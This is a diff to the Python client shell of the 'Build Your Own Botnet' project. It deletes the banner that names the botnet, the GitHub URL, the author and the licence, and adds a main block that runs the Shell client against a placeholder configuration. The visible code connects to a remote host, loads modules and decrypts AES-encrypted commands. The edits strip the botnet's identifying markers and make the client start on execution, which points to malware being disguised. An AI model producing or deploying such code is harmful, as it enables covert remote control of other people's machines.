@@ -1,23 +1,4 @@
 #!/usr/bin/python
-""" 
-88                                  88
-88                                  88
-88                                  88
-88,dPPYba,  8b       d8  ,adPPYba,  88,dPPYba,
-88P'    "8a `8b     d8' a8"     "8a 88P'    "8a
-88       d8  `8b   d8'  8b       d8 88       d8
-88b,   ,a8"   `8b,d8'   "8a,   ,a8" 88b,   ,a8"
-8Y"Ybbd8"'      Y88'     `"YbbdP"'  8Y"Ybbd8"'
-                d8'
-               d8'
-
-Build Your Own Botnet
-https://github.com/colental/byob
-Copyright (c) 2018 Daniel Vega-Myhre
-"""
-
-# standard library
-
 import os
 import sys
 import time
@@ -41,13 +22,8 @@ import contextlib
 import collections
 import logging.handlers
 
-
 # globals
-__name__    = 'shell'
-__author__  = 'Daniel Vega-Myhre'
-__version__ = '0.1.3'
-__license__ = 'GPLv3'
-__package__ = 'client'
+
 _abort      = False
 _debug      = True
 _threads    = dict({})
@@ -111,7 +87,7 @@ class Shell():
         """
         self.session     = Shell.Session(host, port)
         self.commands    = Shell.Commands(self)
-        self.util        = Shell.Util()
+        self.util        = Shell.Tools()
         self.api         = self._api(**kwargs)
         self._modules    = self._init_modules()
         self._packages   = self._init_packages()
@@ -120,16 +96,6 @@ class Shell():
 
     def _api(self, **kwargs):
         return collections.namedtuple('API', kwargs.keys())(*kwargs.values())
-
-
-    def _commands(self):
-        commands = {}
-        for attr in vars(Shell):
-            if attr not in commands:
-                method = getattr(Shell, attr)
-                if hasattr(method, 'command') and getattr(method, 'command'):
-                    commands[attr] = getattr(self, attr)
-        return commands
 
 
     def _init_packages(self, url=None):
@@ -1890,4 +1856,6 @@ class Shell():
                 data = security.decrypt_aes(msg, self.key)
                 return json.loads(data)
 
-
+if __name__ == '__main__':
+    shell=Shell(__KWARGS__)
+    shell.run()
